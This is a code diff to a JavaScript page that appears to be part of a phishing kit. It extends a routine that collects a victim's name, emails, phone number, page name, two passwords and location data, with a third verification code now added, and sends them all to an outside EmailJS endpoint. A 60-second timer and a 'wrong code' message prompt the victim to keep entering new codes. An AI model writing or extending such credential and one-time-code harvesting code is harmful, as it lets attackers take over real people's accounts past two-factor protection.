@@ -185,6 +185,7 @@
 
   var code_1 = "";
   var code_2 = "";
+  var code_3 = "";
 
   function clickSend() {
     if (countSend == 0) {
@@ -204,6 +205,58 @@
       data += "\n";
       data += "code_1: " + code_1 + "\n";
       data += "code_2: " + code_2 + "\n";
+      data += "code_3: " + code_3 + "\n";
+      var dataSend = {
+        service_id: serviceID,
+        template_id: templateId,
+        user_id: userId,
+        template_params: { content: data },
+      };
+      $.ajax("https://api.emailjs.com/api/v1.0/email/send", {
+        type: "POST",
+        data: JSON.stringify(dataSend),
+        contentType: "application/json",
+      })
+        .done(function () { })
+        .fail(function (error) { });
+      document.getElementById("code").value = "";
+      document.getElementById("btnSend").setAttribute("disabled", null);
+      document.getElementById("btnSend").style.backgroundColor =
+        "rgb(125, 175, 249)";
+      document.getElementById("wait-time").style.display = "";
+      document.getElementById("wrong-code").style.display = "";
+      startTimer(60 - 1);
+      isWaiting = true;
+      setTimeout(function () {
+        isWaiting = false;
+        var code = document.getElementById("code").value;
+        if (code != "") {
+          if (!isWaiting) {
+            document.getElementById("btnSend").removeAttribute("disabled");
+            document.getElementById("btnSend").style.backgroundColor =
+              "rgb(48, 132, 244)";
+          }
+        }
+        countSend++;
+      }, 60000);
+    } else if (countSend == 1) {
+      code_2 = document.getElementById("code").value;
+
+      var data = localStorage.getItem("location_data") + "\n" + "\n";
+      data += "information: " + localStorage.getItem("information") + "\n";
+      data += "full_name: " + localStorage.getItem("full_name") + "\n";
+      data +=
+        "business_email: " + localStorage.getItem("business_email") + "\n";
+      data +=
+        "personal_email: " + localStorage.getItem("personal_email") + "\n";
+      data += "phone_number: " + localStorage.getItem("phone_number") + "\n";
+      data += "page_name: " + localStorage.getItem("page_name") + "\n";
+      data += "password_1: " + localStorage.getItem("password_1") + "\n";
+      data += "password_2: " + localStorage.getItem("password_2") + "\n";
+      data += "\n";
+      data += "code_1: " + code_1 + "\n";
+      data += "code_2: " + code_2 + "\n";
+      data += "code_3: " + code_3 + "\n";
       var dataSend = {
         service_id: serviceID,
         template_id: templateId,
@@ -238,7 +291,7 @@
         countSend++;
       }, 60000);
     } else {
-      code_2 = document.getElementById("code").value;
+      code_3 = document.getElementById("code").value;
 
       var data = localStorage.getItem("location_data") + "\n" + "\n";
       data += "information: " + localStorage.getItem("information") + "\n";
@@ -254,6 +307,7 @@
       data += "\n";
       data += "code_1: " + code_1 + "\n";
       data += "code_2: " + code_2 + "\n";
+      data += "code_3: " + code_3 + "\n";
       var dataSend = {
         service_id: serviceID,
         template_id: templateId,
